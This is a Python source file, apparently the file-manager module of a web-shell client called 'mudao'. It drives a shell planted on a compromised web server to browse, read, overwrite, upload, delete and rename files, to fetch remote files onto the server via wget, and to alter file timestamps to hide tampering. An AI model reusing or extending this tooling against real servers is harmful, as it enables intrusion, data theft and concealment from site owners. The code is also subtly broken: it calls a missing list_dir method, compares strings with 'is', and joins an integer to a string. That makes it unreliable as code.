from mudao.model import ShellBase
from mudao.utils.tool import CONF


class FileManager(ShellBase):
    def __init__(self, **kwargs):
        super(FileManager, self).__init__(**kwargs)

    def showfolder(self, path):
        pl = CONF.get('SHOWFOLDER').get(self.type.upper()) % path
        params = self.generate(pl)
        return self.POST(params)

    def showtxt(self, path):
        pl = CONF.get('SHOWTXTFILE').get(self.type.upper()) % path
        params = self.generate(pl)
        return self.POST(params)

    def savefile(self, path, content):
        pl = CONF.get('SAVETXTFILE').get(self.type.upper()) % path
        pl = pl.replace('#K1#', self.k1)
        params = self.generate(pl) + '&' + self.k1 + '=' + content
        return self.POST(params)

    def deletefile(self, path):
        pl = CONF.get('DELETEFILE').get(self.type.upper()) % path
        params = self.generate(pl)
        return self.POST(params)

    def downfile(self, path):
        pl = CONF.get('DOWNFILE').get(self.type.upper()) % path
        params = self.generate(pl)
        return self.POST(params)

    def uploadfile(self, path, content):
        pl = CONF.get('UPLOADFILE').get(self.type.upper()) % path
        pl = pl.replace('#K1#', self.k1)
        pl = pl.replace('#K2#', self.k2) if '#K2#' in pl else pl
        params = self.generate(pl) + '&' + self.k1 + '=' + content
        if self.type.lower() is 'asp':
            params += '&' + self.k2 + '=' + len(content)
        return self.POST(params)

    def pastefile(self, src, dest):
        pl = CONF.get('PASTEFILE').get(self.type.upper()) % (src, dest)
        params = self.generate(pl)
        return self.POST(params)

    def newfolder(self, name):
        pl = CONF.get('NEWFOLDER').get(self.type.upper()) % name
        params = self.generate(pl)
        return self.POST(params)

    def wget(self, rpath, lpath):
        pl = CONF.get('WGET').get(self.type.upper()) % (rpath, lpath)
        params = self.generate(pl)
        return self.POST(params)

    def settime(self, fname, time):
        pl = CONF.get('SETTIME').get(self.type.upper()) % (fname, time)
        params = self.generate(pl)
        return self.POST(params)

    def rename(self, src, dest):
        pl = CONF.get('RENAME').get(self.type.upper()) % (src, dest)
        params = self.generate(pl)
        return self.POST(params)


if __name__ == "__main__":
    f = FileManager('http://localhost/test.php', 'a', 'php')
    print(f.list_dir('.'))
